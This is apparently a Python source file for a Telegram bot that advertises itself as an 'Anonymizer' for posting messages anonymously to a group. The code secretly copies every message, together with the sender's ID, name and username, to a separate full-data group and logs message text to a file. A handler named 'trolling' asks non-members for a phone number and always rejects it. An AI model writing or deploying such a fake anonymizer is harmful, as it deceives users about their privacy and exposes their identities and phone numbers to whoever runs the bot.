import asyncio
import logging
import sys

from aiogram.types import Message
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.methods import DeleteWebhook

from config import dp, bot, ANONIM_GROUP_ID, FULL_DATA_GROUP_ID, DELAY_TIME
from states import Form


@dp.message(Command('start'))
async def start(message: Message):
    user_id = message.from_user.id
    logging.info(f'Пользователь с ID {user_id} запустил бота.')
    await message.answer('👤Anonymizer👤\n\nВы можете отправить сообщение, фото или видео.')


@dp.message()
async def message_handle(message: Message, state: FSMContext):
    user_id = message.from_user.id
    chat_id = message.chat.id
    logging.info(f'Сообщение от пользователя с ID {user_id} из чата с ID {chat_id}. {message.text}')
    if chat_id == user_id:
        user_channel_status = await bot.get_chat_member(chat_id=ANONIM_GROUP_ID, user_id=user_id)
        if user_channel_status['status'] == 'member':
            username = message.from_user.username
            full_name = (f'ID ({user_id}) {message.from_user.first_name} {message.from_user.last_name}'.strip() +
                         (f' @{username}' if username else ''))
            await asyncio.sleep(DELAY_TIME)
            await message.copy_to(chat_id=FULL_DATA_GROUP_ID)
            await bot.send_message(FULL_DATA_GROUP_ID, text=full_name.strip())
            await message.copy_to(chat_id=ANONIM_GROUP_ID)
            await message.delete()
        else:
            await state.set_state(Form.phone_number)
            await message.answer('Введите ваш номер телефона')


@dp.message(Form.phone_number)
async def trolling(message: Message, state: FSMContext):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if chat_id == user_id:
        user_channel_status = await bot.get_chat_member(chat_id=ANONIM_GROUP_ID, user_id=user_id)
        if user_channel_status['status'] == 'member':
            await state.update_data(phone_number=message.text)
            await state.clear()
            await bot.send_message(user_id, 'Теперь вы можете писать сообщение.')
        else:
            await bot.send_message(user_id, 'Вы ввели неправильный номер!')


async def main():
    await bot(DeleteWebhook(drop_pending_updates=True))
    await dp.start_polling(bot)


if __name__ == '__main__':
    logging.basicConfig(
        level=logging.INFO,
        format=('%(asctime)s, '
                '%(levelname)s, '
                '%(funcName)s, '
                '%(message)s'
                ),
        encoding='UTF-8',
        handlers=[logging.FileHandler(__file__ + '.log'),
                  logging.StreamHandler(sys.stdout)]
    )
    asyncio.run(main())
